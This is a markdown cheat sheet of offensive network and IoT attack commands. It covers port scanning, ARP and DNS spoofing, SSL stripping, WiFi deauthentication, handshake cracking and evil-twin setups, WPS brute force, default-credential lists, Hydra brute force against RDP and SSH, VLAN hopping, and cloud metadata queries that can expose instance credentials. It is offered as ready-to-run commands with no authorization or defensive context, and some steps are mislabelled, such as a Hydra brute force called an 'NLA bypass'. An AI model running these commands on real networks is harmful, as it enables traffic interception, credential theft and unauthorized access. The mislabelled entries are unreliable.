# Network & IoT Attack Reference

## Network Scanning

### Nmap
```bash
# Quick scan
nmap -sV -sC target.com

# Full scan
nmap -A -p- target.com

# Vulnerability scan
nmap --script vuln target.com

# UDP scan
nmap -sU --top-ports 100 target.com

# OS detection
nmap -O target.com
```

### Masscan
```bash
# Fast port scan
masscan 10.0.0.0/8 -p0-65535 --rate=10000
```

## Man-in-the-Middle

### ARP Spoofing
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof
arpspoof -i eth0 -t 10.0.0.2 10.0.0.1
```

### DNS Spoofing
```bash
# Using Ettercap
ettercap -G

# Using BetterCAP
sudo bettercap -iface eth0
> arp.spoof on
> dns.spoof on
```

### SSL Stripping
```bash
# Using sslstrip
sslstrip -l 8080

# Using mitmproxy
mitmproxy --mode transparent
```

## WiFi Attacks

### WPA/WPA2
```bash
# Capture handshake
airodump-ng wlan0mon
aireplay-ng -0 5 -a [BSSID] wlan0mon
aircrack-ng -w wordlist.txt capture.cap

# PMKID attack
hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcapng
hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 wordlist.txt
```

### Evil Twin
```bash
# Create fake AP
airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Captive portal
hostapd-mana config.conf
```

### WPS
```bash
# Reaver
reaver -i wlan0mon -b [BSSID] -vv

# Bully
bully -b [BSSID] -c 6 wlan0mon
```

## Bluetooth Attacks

### BLE
```bash
# Scan
hcitool lescan

# GATT enumeration
gatttool -b [MAC] --characteristics

# Replay
# Capture and replay BLE packets
```

### BlueBorne
```bash
# Check vulnerability
# Use Metasploit module
use exploit/linux/misc/blueborne
```

## IoT Attacks

### Default Credentials
```bash
# Common defaults
admin:admin
admin:password
root:root
root:toor
admin:1234
```

### Firmware Analysis
```bash
# Extract firmware
binwalk -e firmware.bin

# Analyze
strings squashfs-root/usr/bin/app | grep -i "password\|key"

# Find hardcoded creds
grep -r "password" squashfs-root/
```

### MQTT
```bash
# Subscribe to all topics
mosquitto_sub -t '#' -v

# Connect with default creds
mosquitto_pub -h target -t topic -m "payload"
```

### CoAP
```bash
# Discover resources
coap-client -m get coap://target/.well-known/core
```

## Protocol Attacks

### SMB
```bash
# Enumerate shares
smbclient -L //target -N

# Crack NTLM
hashcat -m 5600 ntlm_hash.txt wordlist.txt
```

### RDP
```bash
# NLA bypass
hydra -l admin -P wordlist.txt rdp://target

# Session hijacking
# Use Metasploit
```

### SSH
```bash
# Banner grabbing
nc target 22

# Key extraction
ssh-keyscan target

# Username enumeration
hydra -L users.txt -P /dev/null ssh://target
```

## VLAN Attacks

```bash
# VLAN hopping
# Create double-tagged frame
# Use Yersinia for DTP attack
yersinia dtp -attack 1 -interface eth0
```

## IPv6 Attacks

```bash
# Rogue RA
# Advertise as router
# Use fake_advertise6
```

## Cloud Metadata

```bash
# AWS
curl http://169.254.169.254/latest/meta-data/

# GCP
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/

# Azure
curl -H "Metadata:true" http://169.254.169.254/metadata/instance
```
